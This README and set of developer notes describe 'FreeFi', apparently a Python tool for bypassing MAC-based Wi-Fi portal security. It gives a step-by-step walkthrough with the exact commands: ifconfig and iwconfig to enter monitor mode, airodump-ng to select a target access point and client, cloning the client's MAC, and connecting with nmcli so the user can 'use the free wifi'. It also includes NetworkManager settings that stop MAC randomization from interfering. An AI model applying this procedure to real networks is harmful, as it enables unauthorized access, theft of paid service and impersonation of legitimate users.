# FreeFi

Temp dev notes from Steve:
- wifite was very helpful in helping understand some of the gotchas around setting up the wifi device

- Renamed to FreeFi and set the !# bash interpreter line so it will auto-use python when running FreeFi like an executable, you might need to chmod +x it if exe bit not set

- NetworkManager by default in Kali anonymizes and changes the mac address of at least the wifi card automatically every few minutes which is a problem as it conflicts with
our spoofing. Adding file /etc/NetworkManager/conf.d/{anyname}.conf to stop NetworkManager from changing mac addr constantl with contents:

    [device]
    wifi.scan-rand-mac-address=no

    [connection]
    ethernet.cloned-mac-address=preserve
    wifi.cloned-mac-address=preserve

then 'service network-manager restart' if necessary

- ethtool -P wlan0   to get permanent mac address

---- writeup summary below ----

-- FreeFi is a 500+ line python program to bypass MAC based security in wifi portals
-- user supplies wifi interface to use, wlan0 for example
-- step 1: use 'ifconfig' to anonymize our mac address (just to be paranoid and make sure out mac doesn't get out there)
  ifconfig wlan0 down
  ifconfig wlan0 hw ether {random mac address}
  ifconfig wlan0 up
-- step 2: use 'ifconfig' and 'iwconfig' to put wifi adapter in monitor mode
  ifconfig wlan0 down
  iwconfig wlan0 mode monitor
  ifconfig wlan0 up 
-- step 3: use 'airodump-ng' to scan for access points. Airodump writes a CSV file to disk every second
and we parse that CSV file and show the output to the user. When the user sees the AP they want to attack, they ctrl-c and select the access point
  airodump-ng -a --write-interval 1 -w ff-airodump -o csv wlan0
                        "-a",                               # filter unassociated clients
                        "--write-interval", "1",            # write once a second
                        "-w", AIRODUMP_FILE_NAME_PREFIX,    # output file prefix
                        "-o", "csv",                        # only need the csv file
                        iface_name] 

-- step 4: use 'airodump-ng' with diff params to scan for clients connected to the target AP, same as
above airodump write a CSV file that we parse in real time to show client, user presses ctrl-c when
ready and selects a target
  airodump-ng -a --write-interval 1 -w ff-airodump -o csv -c ap_channel --bssid target_bssid
                        "-a",                                   # filter unassociated clients
                        "--write-interval", "1",                # write once a second
                        "-w", AIRODUMP_FILE_NAME_PREFIX,        # output file prefix
                        "-o", "csv",                            # only need the csv file
                        "-c", str(target_access_point.channel), # only scan target ap channel
                        "--bssid", target_access_point.bssid,   # filter for target ap bssid
                        iface_name] 
 
 -- step 5: now we have a target AP and target client, so disable monitor mode on the adapter:  
  ifconfig wlan0 down
  ifconfig wlan0 mode managed
  ifconfig wlan0 up
 set our MAC addr to the client MAC addr:
  ifconfig wlan0 down
  ifconfig wlan0 hw ether target_client_mac_addr
  ifconfig wlan0 up
and then connect to the AP:
  nmcli device wifi connect {access point ssid}
and stay connected while we use the free wifi!

-- step 6: when user is done, they hit ctrl-c and FreeFi disconnects from AP, returns MAC
address to original mac address and quits

learnings and difficulties
- FreeFi is formatted to look similar to wifite, just because it's kinda cool
- discovered that Kali by default randomizes its wifi mac address every few minutes, took a bit
to figure out how to turn that behavior off correctly as it obviously interferes with us
setting the mac address to match the target client
- didn't want to confuse or kill NetworkManager so it took some time to get all of the wifi commands
we're doing to not interfere with NetworkManager so that we can still use it to connect
 to AP (unlike tools like aircrack that might recommend that you kill network manager)
- took a while to figure out which tools give the desired effect, documentation is lacking
in general, often the stuff I can find online is wrong or outdated or just didn't do anything
at all. For example, Using nmcli to connect to wifi AP was the only way that worked reliably vs
using 'iwconfig wlan0 essid {access_point}'
- 